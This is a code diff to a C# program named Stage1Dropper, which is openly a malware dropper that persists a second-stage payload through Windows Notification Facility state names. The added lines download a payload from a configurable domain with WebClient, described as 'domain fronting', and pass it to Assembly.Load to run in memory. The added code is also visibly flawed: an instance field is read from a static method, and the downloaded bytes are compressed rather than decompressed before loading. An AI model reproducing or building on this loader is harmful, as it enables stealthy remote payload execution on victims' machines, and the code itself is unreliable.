@@ -6,6 +6,7 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Net;
 
 namespace Stage1Dropper
 {
@@ -15,7 +16,8 @@ namespace Stage1Dropper
         public const ulong PART_2 = 0x19890C35A3BC6075;
         public const ulong PART_3 = 0x19890C35A3BEC075;
         public const ulong WNF_XBOX_STORAGE_CHANGED = 0x19890C35A3BD6875;
-
+        private string Domain="";
+        
         static void Main(string[] args)
         {
             var casper = new byte[0];
@@ -45,8 +47,16 @@ namespace Stage1Dropper
             {
                 Log("Malware NOT found persisting!");
                 Log("Fetching malware using domain fronting ...");
-                /// TODO: Fetch from web
-                casper = File.ReadAllBytes(@".\Stage2Malware.exe");
+                
+                if (Domain!="")
+                {
+                WebClient Wclient = new WebClient();
+                Assembly.Load(Compress(Wclient.DownloadData(Domain)));                   
+                }
+                else
+                {
+                    casper = File.ReadAllBytes(@".\Stage2Malware.exe");
+                }
 
                 Log("Publishing malware via Windows Kernel to 0x19890C35A3BEF075, 0x19890C35A3BC6075, and 0x19890C35A3BC6875");
 
@@ -152,7 +162,15 @@ namespace Stage1Dropper
             }
             return data;
         }
-
+        private static byte[] Compress(byte[] data)
+        {
+            MemoryStream output = new MemoryStream();
+            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
+            {
+                dstream.Write(data, 0, data.Length);
+            }
+            return output.ToArray();
+}
         [StructLayout(LayoutKind.Sequential)]
         public class WnfType
         {
